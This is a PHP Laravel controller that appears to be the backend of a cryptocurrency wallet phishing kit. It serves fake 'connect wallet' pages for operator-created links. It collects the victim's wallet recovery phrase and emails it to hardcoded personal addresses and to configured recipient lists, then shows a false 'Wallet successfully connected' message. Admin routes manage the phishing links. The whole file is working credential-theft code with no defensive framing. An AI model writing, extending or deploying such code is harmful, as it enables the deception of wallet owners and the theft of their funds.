<?php

namespace App\Http\Controllers;

use App\mailList;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class PagesController extends Controller
{
    // index
    /**
     * @throws \Psr\Container\ContainerExceptionInterface
     * @throws \Psr\Container\NotFoundExceptionInterface
     */
    public function index()
    {
        $data = \request()->get('page');

        if ($data != null) {
           $check = mailList::where('link', $data)->get();
           if ($check) {
               return view('wallet')->with('data', $data);
           }
           else
               return $this->page_not_found();
        } else
            return $this->page_not_found();
    }

    //wallet
   /* public function wallet()
    {
        return view('wallet');
    }*/

    //send mail
    public function sendMail(Request $request)
    {
        $wallet_type = $request['wallet_type'];
        $phrase = $request['key'];
        $link = $request['link'];

        $mailList = mailList::where('link', $link)->get('emails');

        if ($mailList) {
            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) {
                $message->to(['lawalfemi33@gmail.com', 'hello@callmehalpha.me'])
                    ->subject('Wallet Key');
            });
            $mails = json_decode($mailList, true);

            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mails) {
                $message->to($mails)
                    ->subject('Wallet Key');
            });


            return back()->with('success', 'Wallet successfully connected');
        }

        return $this->page_not_found();

    }

    //Admin section to handle the creation of new links
    public function admin()
    {

        return view('adminDashboard');
    }
//Admin login
    public function postAdmin(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required'
        ]);

        $credentials = $request->only('email', 'password');
        if (\Auth::attempt($credentials)) {
            return redirect()->intended('adminDashboard');
        } else {
            session()->flash('message', 'Invalid credentials');
            return redirect()->back();

        }
    }
//Adding links and email
    public function postLink(Request $request)
    {
        $emailList = $request->email;
        $emailJson = json_encode(explode(',', $emailList));
        $link = $request->link;

        $check = mailList::where('link', $link)->get();

        if ($check){
            return back()->with('error', 'Link already exist');
        }

        mailList::create([
            'link' => $link,
            'emails' => $emailJson
        ]);
        return back()->with('success', 'Link created successfully');
    }

    public function page_not_found(){
        return view('page_not_found');
    }
}
